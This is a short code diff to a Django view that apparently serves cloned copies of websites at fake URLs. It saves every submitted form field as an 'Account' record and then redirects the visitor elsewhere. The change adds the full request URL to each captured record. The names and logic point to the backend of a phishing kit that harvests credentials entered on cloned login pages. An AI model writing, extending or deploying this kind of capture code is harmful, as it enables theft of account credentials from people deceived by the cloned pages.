@@ -18,11 +18,12 @@ def renderizator(request, url):
     Responsável por renderizar o site em uma url dinamica
     """
     url = str(url)+'/' if str(url).endswith('/') is not True else url
-
+    
     if request.method == 'POST':
         data = dict(request.POST)
         template = TemplateCopy.objects.get(url_fake=url)
-        acc = Account.objects.create(template=template, datas=data)
+
+        acc = Account.objects.create(template=template, datas=data, url_path=request.build_absolute_uri())
         acc.save()
 
         return redirect(template.redirect or request.build_absolute_uri())
